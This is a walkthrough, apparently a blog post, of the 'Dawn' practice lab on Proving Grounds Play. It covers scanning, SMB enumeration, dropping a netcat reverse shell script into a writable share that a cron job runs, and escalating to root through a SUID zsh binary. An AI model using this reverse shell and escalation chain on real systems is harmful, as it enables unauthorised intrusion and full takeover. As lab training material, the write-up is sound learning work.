# $\color{Magenta}{Proving\ Grounds\ Play:\ Dawn\ Walkthrough}$
## $\color{Magenta}{Pentest\ performed\ in\ the\ Dawn\ machine\ on\ Proving\ Grounds\ Play.}$

![image 1](https://miro.medium.com/v2/resize:fit:640/format:webp/0*NzgnefT4Xcg8Ek1a)

### $\color{Cyan}{Scanning}$
I started with the first essential step, a network scan to see the available open ports and their services. As always, I did it with **nmap.**

```nmap -sS -Sv <machine ip>```

![image 2](https://miro.medium.com/v2/resize:fit:640/format:webp/1*OL8i2ITKXvZxVhxmzv0xtg.png)

The scan shows several open ports:

- **80 (HTTP).** A website.
- **139/445 (CIFS/SMB).** Client-server protocol, a shared file system.
- **3306 (mysql).**
- Host name: **DAWN.**

### $\color{Cyan}{Enumeration}$
**1. Website Enumeration**

![image 3](https://miro.medium.com/v2/resize:fit:720/format:webp/1*rfg9FgC0V7oziZHeFg4sBw.png)

I view the source code to search for any hidden clues, like other directories, but I found nothing. So, in that moment, the only information I had was the things to implement message, indicating possible interesting features.

My next step was searching for directories with **gobuster**, to find hidden or unlisted directories or files:

```gobuster dir -u <URL> -w <path to wordlist>```

![image 4](https://miro.medium.com/v2/resize:fit:720/format:webp/1*JB3_lDhALTay3YtOXDjozg.png)

I checked the cctv directory, but I didn’t have the necessary permissions.

But the **logs directory** did show:

![image 5](https://miro.medium.com/v2/resize:fit:640/format:webp/1*gYPgiCrdLkc8BNcCtTgwGQ.png)

The only file I could visit was **management.log**, which was a configuration file with information about the machine’s cron actions. Specifically, the commands executed by this file. I need to highlight the following commands:

![image 6](https://miro.medium.com/v2/resize:fit:640/format:webp/1*2NaYXmsBvSi0FRal-UFOoA.png)

- The actions show in the photo above, where cron executes the files **product-control** and **web-control.**
- The **777 chmod command**, giving all the permissions of **product-control** and **web-control** to all the users (owner, group and others).

Therefore, the management.log indicates that the cron grants full permissions on the product-control and web-control files to then execute them. These were two key findings, because it opened a possible entry point to an exploitation.

**2. SMB Enumeration**

The next port to enumerate was the **139/445 port**, indicating the existence of a **SMB protocol.**

I executed the command **enum4linux**, which displays information about the shares and users in the shared file system:

```enum4linux <machine IP>```

![image 7](https://miro.medium.com/v2/resize:fit:720/format:webp/1*jy8ibCfXHwlw0TTHAuGiwg.png)

![image 8](https://miro.medium.com/v2/resize:fit:720/format:webp/1*s3HeCQ1P7HR0OjKhG6KJzQ.png)

The key findings were:

- Two local users: **dawn** and **ganimedes.**
- The possibility to enter a session with **no password.**
- The share **ITDEPT**, with the permissions read/write. At this point, the entry point was surely this, due to the previously seen cron actions where the executed files were in that share. It also shows the already known username dawn.

### $\color{Cyan}{Exploitation}$

The information I had at this moment was:

- Cron changes permissions and executes two files in the directory **dawn/ITDEPT.**
- A SMB protocol with the username **dawn** and a share named **ITDEPT** with write access that I could enter without a password.

The next logical step was access the **SMB** share **ITDEPT.** I used smbclient:

```smbclient //<machine IP>/ITDEPT```

![image 9](https://miro.medium.com/v2/resize:fit:640/format:webp/1*hXMXQ7N0CAQ8rNiVQ3jyHQ.png)

Using the command *“ls”* I found the share empty. To exploit the cron vulnerability seen in **management.log,** I created a file named **product-control** embedded with a reverse shell script:

```
#!/bin/bash
nc -e /bin/bash <your IP> <port>
```

With this, the cron would execute the reverse shell script in that file with root privileges, allowing me to enter the target machine.

I uploaded that file with *“put”* and listened with **netcat** on the port indicated.

```nc -lvnp 1234```

And in a minute, I was in!

![image 10](https://miro.medium.com/v2/resize:fit:640/format:webp/1*dd9LBgkgaxIjVpLuLbTj_w.png)

### $\color{Cyan}{Privilege\ escalation}$

With the command *“whoami”* I knew the user: **dawn.**

To convert the Shell to a terminal and make it more comfortable, I executed:

```python -c 'import pty; pty.spawn("/bin/bash")'```

With another *“ls -la”* command I discovered the first flag in the **local.txt.** The last step was the privilege escalation.

For that, I first executed *“sudo su”*, but I needed a password. Then I executed *“sudo -l”,* to see the command available to the user **dawn**, but I didn’t find anything useful:

![image 11](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Z5JYH5TidshwTcqHT8e5Lg.png)

Lastly, I searched the binaries with the **SUID** bit active. **SUID** gives a temporary permission to the current user to run a program or a file with the owner’s permissions. So, if we execute a sudo command with that SUID bit active, we’ll get root permissions.

To search those binaries I ran the following command:

```find / -perm -u=s -type f 2>/dev/null```

In case on any doubts, I used the web **GTFOBins**, a list with all the exploitable binaries.

![image 12](https://miro.medium.com/v2/resize:fit:640/format:webp/1*tTECq7ccA_5Je168kp8-1Q.png)

Among that list and according to **GTFOBins**, the exploitable binary was zsh, another type of shell.

![image 13](https://miro.medium.com/v2/resize:fit:720/format:webp/1*TViuB4wAxPkiKdoGwPJm9g.png)

I just run zsh and I had my privileges elevated to root, confirming it with the “whoami” command.

![image 14](https://miro.medium.com/v2/resize:fit:284/format:webp/1*ttZT4CWt-vwLo4YC-4wPIg.png)

And finally, I could access the root directory and find the final flag.
